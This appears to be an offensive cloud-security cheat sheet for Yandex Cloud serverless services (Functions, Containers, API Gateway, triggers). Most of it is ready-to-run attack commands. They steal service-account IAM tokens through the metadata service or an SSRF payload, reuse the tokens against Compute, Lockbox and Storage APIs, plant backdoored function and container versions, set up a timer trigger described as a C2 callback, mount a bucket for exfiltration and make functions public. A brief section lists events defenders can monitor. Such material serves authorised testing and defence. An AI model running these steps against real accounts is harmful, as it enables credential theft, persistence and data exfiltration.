# Yandex Cloud - Serverless Techniques

## Service Overview

Yandex Cloud Serverless encompasses Cloud Functions, Serverless Containers, API Gateway, and Message Queue. Functions and containers run on Ubuntu 22.04 LTS (kernel 5.15) with access to the metadata service at `169.254.169.254`. Service accounts linked to functions/containers provide IAM tokens automatically. Functions can be public (no auth) or private (IAM token / API key required). Containers can only use images from Yandex Container Registry.

**Key Concepts:**
- **Cloud Functions**: Event-driven code execution. Versions are auto-tagged `$latest`. Invocation URL: `https://functions.yandexcloud.net/<function_id>`
- **Serverless Containers**: HTTP server containers from Yandex Container Registry. URL: `https://<container_id>.containers.yandexcloud.net/`
- **API Gateway**: OpenAPI 3.0-based gateway with Yandex-specific `x-yc-apigateway-integration` extensions
- **Triggers**: Event-driven invocation from Object Storage, Message Queue, Container Registry, timers, Cloud Logging, IoT Core, etc.
- **Message Queue**: SQS-compatible HTTP API authenticated via static access keys
- **SA Token Access**: Via handler context (`context.token`) in functions, or metadata service (`169.254.169.254`) in both functions and containers

---

## Enumeration

### Enumerate Functions

```bash
# List all functions in the folder
yc serverless function list

# Get function details (ID, folder_id, http_invoke_url, status)
yc serverless function get <function_id>

# List function versions
yc serverless function version list --function-name <function_name>

# Get version details (shows SA ID, environment variables, runtime, source)
yc serverless function version get <version_id>

# List access bindings (check for public access)
yc serverless function list-access-bindings <function_name>

# List operations (audit trail)
yc serverless function list-operations <function_id>
```

### Enumerate Containers

```bash
# List containers
yc serverless container list

# Get container details
yc serverless container get <container_name>

# List revisions
yc serverless container revision list --container-name <name>

# Get revision details (shows SA ID, image, env vars)
yc serverless container revision get <revision_id>

# List access bindings
yc serverless container list-access-bindings <container_name>
```

### Enumerate API Gateways

```bash
# List API gateways
yc serverless api-gateway list

# Get gateway details (includes OpenAPI spec with all integrations)
yc serverless api-gateway get <gateway_id>
```

**The OpenAPI spec reveals**: function IDs, container IDs, service account IDs, bucket names, queue URLs, database paths, authorizer configurations.

### Enumerate Triggers

```bash
# List all triggers
yc serverless trigger list

# Get trigger details (shows event source, target function, SA)
yc serverless trigger get <trigger_id>
```

### Check for Public Functions/Containers

```bash
# Check if a function is publicly accessible
yc serverless function list-access-bindings <function_id>
# Look for: role=functions.functionInvoker, subject=system:allUsers

# Test direct invocation (no auth)
curl -s "https://functions.yandexcloud.net/<function_id>"

# Check containers
yc serverless container list-access-bindings <container_id>
curl -s "https://<container_id>.containers.yandexcloud.net/"
```

---

## Credential Access

### Steal IAM Token from Inside Function

Functions receive the linked SA's IAM token in two ways:

```python
# Method 1: Handler context (functions only)
def handler(event, context):
    token = context.token  # IAM token string
    # Use token to call any Yandex Cloud API the SA has access to
```

```bash
# Method 2: Metadata service (functions and containers)
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
# Returns: {"access_token":"t1.9euelZr...","expires_in":43200,"token_type":"Bearer"}
```

### SSRF to Metadata Service

If a function/container has an SSRF vulnerability, the metadata service can be reached to steal the IAM token:

```
# SSRF payload
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# Requires Metadata-Flavor: Google header — some SSRF vectors allow header injection
```

**Note**: The `gce-http-endpoint` and `aws-v1-http-endpoint` metadata options can disable the metadata service, but they are enabled by default.

### Harvest Environment Variables

Functions and containers can have secrets stored as environment variables (including Lockbox-injected secrets):

```bash
# With functions.editor, view function version details including env vars
yc serverless function version get <version_id> --format json | jq '.environment'

# With serverless-containers.editor
yc serverless container revision get <revision_id> --format json | jq '.environment'
```

### Lockbox Secret Caching Window

Lockbox secrets injected into functions are **cached for up to 5 minutes** after SA access is revoked. During incident response, rotating the secret value itself (not just revoking SA access) is necessary for immediate effect.

### Extract SA IDs from API Gateway Specs

API Gateway OpenAPI specs contain `service_account_id` values for every integration:

```bash
yc serverless api-gateway get <gateway_id> --format json | jq '.openapi_spec'
# Parse for service_account_id values across all integrations
```

---

## Privilege Escalation

### SA Token Reuse — Escape Function Scope

The SA token obtained inside a function is not scoped to the function — it can access ANY Yandex Cloud API the SA has permissions for:

```bash
# From inside a function, use the token for broader access
TOKEN=$(curl -sf -H "Metadata-Flavor:Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token \
  | jq -r .access_token)

# Access Compute
curl -H "Authorization: Bearer $TOKEN" \
  "https://compute.api.cloud.yandex.net/compute/v1/instances?folderId=<folder_id>"

# Access Lockbox
curl -H "Authorization: Bearer $TOKEN" \
  "https://payload.lockbox.api.cloud.yandex.net/lockbox/v1/secrets/<secret_id>/payload"

# Access Object Storage
curl -H "Authorization: Bearer $TOKEN" \
  "https://storage.yandexcloud.net/<bucket>"
```

### Code Injection via S3 Source

If a function loads code from an Object Storage bucket and you have write access to that bucket, you can inject malicious code:

```bash
# Replace the function's source code in S3
aws s3 cp backdoor.zip s3://<source_bucket>/<source_object> \
  --endpoint-url https://storage.yandexcloud.net

# Next function version create or update will use the backdoored code
```

### VPC Pivot — Access Internal Resources

Functions/containers with VPC network configured can access internal resources:

```bash
# Function with network access can reach:
# - Internal VMs at their private IPs
# - Managed databases (PostgreSQL, MySQL, ClickHouse, etc.)
# - Any resource in the VPC network
# Service subnets are created in 198.19.0.0/16 range
```

### API Gateway Authorizer Bypass

If the authorizer function has logical flaws, all protected endpoints are exposed:

```yaml
# Common misconfigurations in x-yc-apigateway-authorizer:
# - Missing issuers/audiences validation in JWT authorizer
# - Function authorizer that returns isAuthorized: true unconditionally
# - Missing service_account_id (backend called without auth)
```

### Make Functions Public

```bash
# Grant public access (requires functions.admin)
yc serverless function allow-unauthenticated-invoke <function_name>

# Or via access binding
yc serverless function add-access-binding --id <function_id> \
  --role functions.functionInvoker --all-authenticated-users
```

---

## Persistence

### Deploy Backdoor Function Version

Replace function code with a backdoor — new versions are auto-tagged `$latest`:

```bash
yc serverless function version create \
  --function-name=<target_function> \
  --runtime nodejs18 \
  --entrypoint index.handler \
  --memory 128m \
  --execution-timeout 5s \
  --source-path ./backdoor.zip \
  --service-account-id <sa_id>
```

### Create Timer Trigger for C2 Callback

Set up a cron-based trigger for periodic code execution:

```bash
yc serverless trigger create timer \
  --name health-check \
  --cron-expression "*/5 * * * ? *" \
  --invoke-function-id <backdoor_function_id> \
  --invoke-function-service-account-id <sa_id>
```

### Create Object Storage Trigger for Event Monitoring

Get notified and execute code whenever files are uploaded to a bucket:

```bash
yc serverless trigger create object-storage \
  --name upload-monitor \
  --bucket-id <bucket_id> \
  --events 'create-object' \
  --invoke-function-id <function_id> \
  --invoke-function-service-account-id <sa_id>
```

### Mount Writable S3 Bucket for Exfiltration

```bash
yc serverless function version create \
  --function-name=<function> \
  --runtime nodejs18 \
  --entrypoint index.handler \
  --memory 128m \
  --execution-timeout 5s \
  --source-path ./code.zip \
  --service-account-id <sa_id> \
  --mount type=object-storage,mount-point=exfil,bucket=<bucket>,mode=rw
```

Data written to `/function/storage/exfil/` persists in the S3 bucket.

### Deploy Backdoor Container Revision

```bash
yc serverless container revision deploy \
  --container-name <container> \
  --image cr.yandex/<registry_id>/<backdoor_image>:latest \
  --cores 1 \
  --memory 1GB \
  --service-account-id <sa_id>
```

---

## Post-Exploitation

### Enumerate All Functions and Their SAs

```bash
# Map functions to their linked service accounts
yc serverless function version list --function-name <name> --format json | \
  jq '.[] | {function_id, id, service_account_id, tag}'

# Same for containers
yc serverless container revision list --container-name <name> --format json | \
  jq '.[] | {container_id, id, service_account_id}'
```

### Extract API Gateway Integration Details

```bash
# Get the full OpenAPI spec to discover backend services
yc serverless api-gateway get <id> --format json | \
  jq -r '.openapi_spec' | grep -E 'function_id|container_id|service_account_id|bucket|queue_url|database'
```

### Invoke Private Functions

```bash
# With IAM token
curl -s -H "Authorization: Bearer <IAM_TOKEN>" \
  "https://functions.yandexcloud.net/<function_id>"

# With API key (service account)
curl -s -H "Authorization: Api-Key <API_KEY>" \
  "https://functions.yandexcloud.net/<function_id>"

# Via CLI
yc serverless function invoke <function_id> -d '{"key": "value"}'

# Specific version via tag
curl -s -H "Authorization: Bearer <IAM_TOKEN>" \
  "https://functions.yandexcloud.net/<function_id>?tag=<version_tag>"
```

---

## Key IAM Roles

### Cloud Functions

| Role | What it Enables |
|---|---|
| `functions.auditor` | View functions, triggers, access permissions |
| `functions.viewer` | View function details and quotas |
| `functions.functionInvoker` | **Invoke functions** |
| `functions.editor` | Create/modify/delete/invoke functions, triggers. **View env vars and code** |
| `functions.admin` | Full control + manage access bindings |

### Serverless Containers

| Role | What it Enables |
|---|---|
| `serverless-containers.auditor` | View container info |
| `serverless-containers.viewer` | View container details and quotas |
| `serverless-containers.containerInvoker` | **Invoke containers** |
| `serverless-containers.editor` | Create/modify/delete/invoke containers. **View env vars** |
| `serverless-containers.admin` | Full control + manage access bindings |

### API Gateway

| Role | What it Enables |
|---|---|
| `api-gateway.auditor` | View API gateway info |
| `api-gateway.viewer` | View details and access permissions |
| `api-gateway.editor` | Create/modify/delete gateways, WebSocket operations |
| `api-gateway.admin` | Full control + manage access bindings |

### Message Queue

| Role | What it Enables |
|---|---|
| `ymq.reader` | Read from queues |
| `ymq.writer` | Write to queues |
| `ymq.admin` | Full queue management |

---

## Key Endpoints

| Service | URL |
|---|---|
| Function invocation | `https://functions.yandexcloud.net/<function_id>` |
| Container invocation | `https://<container_id>.containers.yandexcloud.net/` |
| Functions API | `https://serverless-functions.api.cloud.yandex.net` |
| Containers API | `https://serverless-containers.api.cloud.yandex.net` |
| Message Queue API | `https://message-queue.api.cloud.yandex.net` |
| Metadata service (inside) | `http://169.254.169.254/computeMetadata/v1/` |

---

## Detection and Logging

### Function Execution Logs

Functions write to Cloud Logging (default log group for the folder):
```
START RequestID: 34dc9533-... Version: b09i2s85a0c1********
END RequestID: 34dc9533-...
REPORT RequestID: 34dc9533-... Duration: 538.610 ms Billed Duration: 538.700 ms Memory Size: 128 MB Max Memory Used: 13 MB
```

```bash
yc serverless function logs <function_name>
```

### Key Events to Monitor

- `CreateFunctionVersion` — new code deployed
- `UpdateFunction` — function configuration changed
- `CreateTrigger` / `DeleteTrigger` — trigger lifecycle
- `AllowUnauthenticatedInvoke` — function made public
- `SetAccessBindings` with `allUsers` — public access granted
- `CreateApiGateway` / `UpdateApiGateway` — gateway spec changes
- Unusual invocation patterns — high frequency or off-hours calls

### Note on Stripped Headers

The `Authorization` header is **stripped** before reaching function code. Other stripped headers: `Expect`, `Te`, `Trailer`, `Upgrade`, `Proxy-Authenticate`, `Connection`, `Content-Md5`, `Max-Forwards`, `Server`, `Transfer-Encoding`, `Www-Authenticate`, `Cookie`.

---

## References

- Cloud Functions Documentation: `en/functions/`
- Serverless Containers Documentation: `en/serverless-containers/`
- API Gateway Documentation: `en/api-gateway/`
- Message Queue Documentation: `en/message-queue/`
- Functions Security Roles: `en/functions/security/index.md`
- Trigger Concepts: `en/functions/concepts/trigger/index.md`
